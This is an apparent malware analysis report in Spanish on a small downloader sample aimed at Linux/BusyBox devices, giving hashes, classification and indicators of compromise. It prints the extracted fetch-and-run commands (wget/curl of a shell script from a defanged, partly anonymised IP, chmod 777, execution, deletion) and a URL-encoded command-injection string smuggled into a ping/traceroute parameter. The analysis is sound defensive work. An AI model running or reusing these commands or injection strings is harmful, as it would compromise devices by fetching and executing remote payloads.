# 🧬 Payload Analysis

`3734fd5f4b17e1a047971460c74e43645354ae3b7a52336e5460054a66f65545`

## 📌 Resumen

Texto ASCII de 392 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.lynkapp`
5. `rm -f .s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/3734fd5f4b17e1a047971460c74e43645354ae3b7a52336e5460054a66f65545.md](../../../../../malware-like/oraculo/downloader/3734fd5f4b17e1a047971460c74e43645354ae3b7a52336e5460054a66f65545.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3734fd5f4b17e1a047971460c74e43645354ae3b7a52336e5460054a66f65545`
- **SHA1:** `53e6b4fa883ee1cb10799396f93ecc672b6fa464`
- **MD5:** `344c09b60696e7b52f8cfcf5eedfd2c5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (392), with no line terminators |
| Tamaño | 392 B |
| Entropía | 4.98 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (392), with no line terminators; iocs=3

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.lynkapp%3Brm%20-f%20.s&ping_times=5&traceroute_ip=[internal-ip-redacted] | strings |
| ip | 91.92.40.XXX | static_analysis |
| hash | 3734fd5f4b17e1a047971460c74e43645354ae3b7a52336e5460054a66f65545 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
